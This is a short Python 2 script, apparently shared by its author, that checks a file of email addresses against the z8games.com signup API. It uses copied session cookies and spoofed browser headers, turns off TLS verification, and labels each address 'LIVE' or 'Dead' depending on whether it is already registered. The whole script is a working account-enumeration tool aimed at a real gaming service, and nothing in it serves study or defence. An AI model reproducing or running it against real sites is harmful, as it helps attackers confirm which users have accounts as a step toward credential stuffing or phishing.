import requests
"""
By ELWAZIRY
FB: FB.COM/elwaziry.htmI
"""
emails = open('emails.txt','r').readlines()

for line in emails:
	final = line.strip()

	#Cookies
	cookies = {
	    '_fbp': 'fb.1.1589651335590.528431590',
	    'TS0147caf9': '01b1135b6bd44d6663074dc99ece6d0851e6f604b51589cae7269ed90760f45a7c9fa9869db4017700613073c3390a66b02ca3101a',
	    'TS2b05ffd8029': '082b33cd12ab28005097b38e803fde4d33a3605a58399dddb3d4c44babda679c41b7a683bd7683a6df996ab5eaa91cfb',
	    'TSccb74296027': '082b33cd12ab2000402c63554d134a72bbfd359e0041967650286409275a13f1f8295f29dbe211e00865c73a8d113000a94bd19ccbd2b171af0163610c4af45ce7895c0e44155834e37ea6ca9e428cbe082a6d5b72b94f2c428efc9d658e40f7',
	    'TSf2407a92029': '082b33cd12ab2800773b7dfc7b6e1877f519adfe39871cf8a13d210a38c12f1245f39086c4681b4ab7fe8c7f02e06801',
	    'TS15f2c7dc027': '082b33cd12ab200005491d3b4847d172eefb5e06d3a897b820fbdda65fb71d6a6488dfdfe11927cb08218217341130003773648d5947dcf4729d422f75f6fc94d5eb3c1dd2eae80b2757e073eaf756c123f5c461e18f962db22e2941693694be',
	    '_ga': 'GA1.2.1146608670.1589651341',
	    '_gid': 'GA1.2.232350440.1589651341',
	    '_dc_gtm_UA-34181772-1': '1',
	}
	# Headers
	headers = {
	    'Connection': 'keep-alive',
	    'Accept': 'application/json, text/javascript, */*; q=0.01',
	    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
	    'X-Requested-With': 'XMLHttpRequest',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Dest': 'empty',
	    'Referer': 'https://www.z8games.com/signup.html?gid=11',
	    'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
	}

	params = (
	    ('request', 'checkemail'),
	    ('email', final),
	)

	response = requests.get('http://www.z8games.com//loging/restapi/account.php', headers=headers, params=params, cookies=cookies, verify=False)
	#Response from API
	responseapi = response.content
	#response = > {"data":"Email already in use.","id":"533","key":"","status":"false"}
	# IF Statment
	if "Email already in use" in response.content:
	 print "LIVE => "+final
	 
	else:
	 print "Dead => "+final